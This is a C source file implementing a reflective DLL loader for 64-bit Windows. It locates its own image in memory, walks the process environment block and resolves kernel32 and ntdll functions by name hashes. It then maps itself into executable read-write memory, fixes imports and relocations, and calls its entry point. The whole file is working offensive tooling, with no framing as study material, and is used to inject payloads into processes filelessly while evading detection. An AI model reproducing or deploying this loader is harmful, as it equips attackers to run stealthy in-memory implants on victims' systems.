#include "ReflectiveLoader.h"
HINSTANCE hAppInstance = NULL;
#pragma intrinsic( _ReturnAddress )
__declspec(noinline) ULONG_PTR caller(VOID) { return (ULONG_PTR)_ReturnAddress(); }
DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
{
	LOADLIBRARYA pLoadLibraryA = NULL;
	GETPROCADDRESS pGetProcAddress = NULL;
	VIRTUALALLOC pVirtualAlloc = NULL;
	NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;
	USHORT usCounter;
	// the initial location of this image in memory
	ULONG_PTR uiLibraryAddress;
	// the kernels base address and later this images newly loaded base address
	ULONG_PTR uiBaseAddress;
	// variables for processing the kernels export table
	ULONG_PTR uiAddressArray;
	ULONG_PTR uiNameArray;
	ULONG_PTR uiExportDir;
	ULONG_PTR uiNameOrdinals;
	DWORD dwHashValue;
	// variables for loading this image
	ULONG_PTR uiHeaderValue;
	ULONG_PTR uiValueA;
	ULONG_PTR uiValueB;
	ULONG_PTR uiValueC;
	ULONG_PTR uiValueD;
	ULONG_PTR uiValueE;
	uiLibraryAddress = caller();
	while (TRUE)
	{
		if (((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_magic == IMAGE_DOS_SIGNATURE)
		{
			uiHeaderValue = ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

			if (uiHeaderValue >= sizeof(IMAGE_DOS_HEADER) && uiHeaderValue < 1024)
			{
				uiHeaderValue += uiLibraryAddress;

				if (((PIMAGE_NT_HEADERS)uiHeaderValue)->Signature == IMAGE_NT_SIGNATURE)
					break;
			}
		}
		uiLibraryAddress--;
	}
	uiBaseAddress = __readgsqword(0x60);
	uiBaseAddress = (ULONG_PTR)((_PPEB)uiBaseAddress)->pLdr;
	uiValueA = (ULONG_PTR)((PPEB_LDR_DATA)uiBaseAddress)->InMemoryOrderModuleList.Flink;
	while (uiValueA)
	{
		uiValueB = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.pBuffer;
		usCounter = ((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.Length;
		uiValueC = 0;
		// compute the hash of the module name...
		do
		{
			uiValueC = ror((DWORD)uiValueC);
			// normalize to uppercase if the madule name is in lowercase
			if (*((BYTE*)uiValueB) >= 'a')
				uiValueC += *((BYTE*)uiValueB) - 0x20;
			else
				uiValueC += *((BYTE*)uiValueB);
			uiValueB++;
		} while (--usCounter);
		if ((DWORD)uiValueC == KERNEL32DLL_HASH)
		{
			uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;
			uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;
			uiNameArray = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir) -> OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
			uiExportDir = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);
			uiNameArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames);
			uiNameOrdinals = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir) -> AddressOfNameOrdinals);
			usCounter = 3;
			while (usCounter)
			{
				dwHashValue = hash((char*)(uiBaseAddress + DEREF_32(uiNameArray)));
				if (dwHashValue == LOADLIBRARYA_HASH || dwHashValue == GETPROCADDRESS_HASH ||
					dwHashValue == VIRTUALALLOC_HASH)
				{
					uiAddressArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir) -> AddressOfFunctions);
					uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));
					if (dwHashValue == LOADLIBRARYA_HASH)
						pLoadLibraryA = (LOADLIBRARYA)(uiBaseAddress + DEREF_32(uiAddressArray));
					else if (dwHashValue == GETPROCADDRESS_HASH)
						pGetProcAddress = (GETPROCADDRESS)(uiBaseAddress + DEREF_32(uiAddressArray));
					else if (dwHashValue == VIRTUALALLOC_HASH)
						pVirtualAlloc = (VIRTUALALLOC)(uiBaseAddress + DEREF_32(uiAddressArray));
					usCounter--;
				}
				uiNameArray += sizeof(DWORD);
				uiNameOrdinals += sizeof(WORD);
			}
		}
		else if ((DWORD)uiValueC == NTDLLDLL_HASH)
		{
			uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;
			uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;
			uiNameArray = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir) -> OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
			uiExportDir = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);
			uiNameArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames);
			uiNameOrdinals = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir) -> AddressOfNameOrdinals);
			usCounter = 1;
			while (usCounter > 0)
			{
				dwHashValue = hash((char*)(uiBaseAddress + DEREF_32(uiNameArray)));
				if (dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH)
				{
					uiAddressArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir) -> AddressOfFunctions);
					uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));
					if (dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH)
						pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)(uiBaseAddress +
							DEREF_32(uiAddressArray));
					usCounter--;
				}
				uiNameArray += sizeof(DWORD);
				uiNameOrdinals += sizeof(WORD);
			}
		}
		if (pLoadLibraryA && pGetProcAddress && pVirtualAlloc && pNtFlushInstructionCache)
			break;

		uiValueA = DEREF(uiValueA);
	}
	uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
	uiBaseAddress = (ULONG_PTR)pVirtualAlloc(NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue) -> OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
	uiValueB = uiLibraryAddress;
	uiValueC = uiBaseAddress;
	while (uiValueA--)
		*(BYTE*)uiValueC++ = *(BYTE*)uiValueB++;
	uiValueA = ((ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader +
		((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader);
	uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
	while (uiValueE--)
	{
		uiValueB = (uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress);
		uiValueC = (uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData);
		uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;
		while (uiValueD--)
			*(BYTE*)uiValueB++ = *(BYTE*)uiValueC++;
		uiValueA += sizeof(IMAGE_SECTION_HEADER);
	}
	uiValueB = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue) -> OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);
	while (((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name)
	{
		uiLibraryAddress = (ULONG_PTR)pLoadLibraryA((LPCSTR)(uiBaseAddress +
			((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name));
		uiValueD = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk);
		uiValueA = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk);
		while (DEREF(uiValueA))
		{
			if (uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			{
				uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
				uiNameArray = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir) -> OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
				uiExportDir = (uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);
				uiAddressArray = (uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir) -> AddressOfFunctions);
				uiAddressArray += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal) -
					((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->Base) * sizeof(DWORD));
				DEREF(uiValueA) = (uiLibraryAddress + DEREF_32(uiAddressArray));
			}
			else
			{
				uiValueB = (uiBaseAddress + DEREF(uiValueA));
				DEREF(uiValueA) = (ULONG_PTR)pGetProcAddress((HMODULE)uiLibraryAddress,
					(LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);
			}

			uiValueA += sizeof(ULONG_PTR);
			if (uiValueD)
				uiValueD += sizeof(ULONG_PTR);
		}
		uiValueC += sizeof(IMAGE_IMPORT_DESCRIPTOR);
	}
	uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;
	uiValueB = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue) -> OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if (((PIMAGE_DATA_DIRECTORY)uiValueB)->Size)
	{
		uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);
		while (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock)
		{
			uiValueA = (uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress);
			uiValueB = (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))
				/ sizeof(IMAGE_RELOC);
			uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);
			while (uiValueB--)
			{
				if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64)
					*(ULONG_PTR*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW)
					*(DWORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH)
					*(WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW)
					*(WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);
				uiValueD += sizeof(IMAGE_RELOC);
			}
			uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
		}
	}
	uiValueA = (uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint);
	pNtFlushInstructionCache((HANDLE)-1, NULL, 0);
	((DLLMAIN)uiValueA)((HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, lpParameter);
	return uiValueA;
}
